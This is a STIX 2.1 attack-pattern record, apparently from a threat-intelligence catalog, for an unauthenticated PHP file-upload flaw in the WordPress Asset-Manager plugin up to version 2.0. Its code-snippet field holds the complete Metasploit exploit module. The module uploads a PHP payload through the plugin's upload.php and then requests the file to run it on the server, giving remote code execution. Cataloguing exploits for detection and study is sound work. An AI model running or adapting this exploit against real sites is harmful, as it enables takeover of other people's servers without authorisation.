{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e445a243-06a2-414f-9cab-9dba5113730a",
    "created": "2024-08-14T17:12:27.730324Z",
    "modified": "2024-08-14T17:12:27.730328Z",
    "name": "WordPress Asset-Manager PHP File Upload Vulnerability",
    "description": "( This module exploits a vulnerability found in Asset-Manager <= 2.0 WordPress plugin. By abusing the upload.php file, a malicious user can upload a file to a temp directory without authentication, which results in arbitrary code execution. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_asset_manager_upload_exec.rb",
            "external_id": "wp_asset_manager_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.opensyscom.fr/Actualites/wordpress-plugins-asset-manager-shell-upload-vulnerability.html"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6106"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'WordPress Asset-Manager PHP File Upload Vulnerability',\n      'Description'    => %q(\n        This module exploits a vulnerability found in Asset-Manager <= 2.0 WordPress\n        plugin. By abusing the upload.php file, a malicious user can upload a file to a\n        temp directory without authentication, which results in arbitrary code execution.\n      ),\n      'Author'         =>\n        [\n          'Sammy FORGIT',                           # initial discovery\n          'James Fitts <fitts.james[at]gmail.com>'  # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '82653'],\n          ['BID', '53809'],\n          ['EDB', '18993'],\n          ['URL', 'http://www.opensyscom.fr/Actualites/wordpress-plugins-asset-manager-shell-upload-vulnerability.html'],\n          ['WPVDB', '6106']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['asset-manager <= 2.0', {}]],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2012-05-26'))\n  end\n\n  def check\n    uri = normalize_uri(wordpress_url_plugins, 'asset-manager', 'upload.php')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n\n    return Exploit::CheckCode::Unknown if res.nil? || res.code != 200\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    payload_name = \"#{rand_text_alpha(5)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{payload_name}\\\"\")\n    post_data = data.to_s\n\n    print_status(\"Uploading payload #{payload_name}\")\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(wordpress_url_plugins, 'asset-manager', 'upload.php'),\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data\n    )\n\n    if res.nil? || res.code != 200 || res.body !~ /#{payload_name}/\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    register_files_for_cleanup(payload_name)\n\n    print_status(\"Executing payload #{payload_name}\")\n    send_request_raw(\n      'uri'     => normalize_uri(wordpress_url_wp_content, 'uploads', 'assets', 'temp', payload_name),\n      'method'  => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-26",
    "x_mitre_platforms": [
        "php'"
    ]
}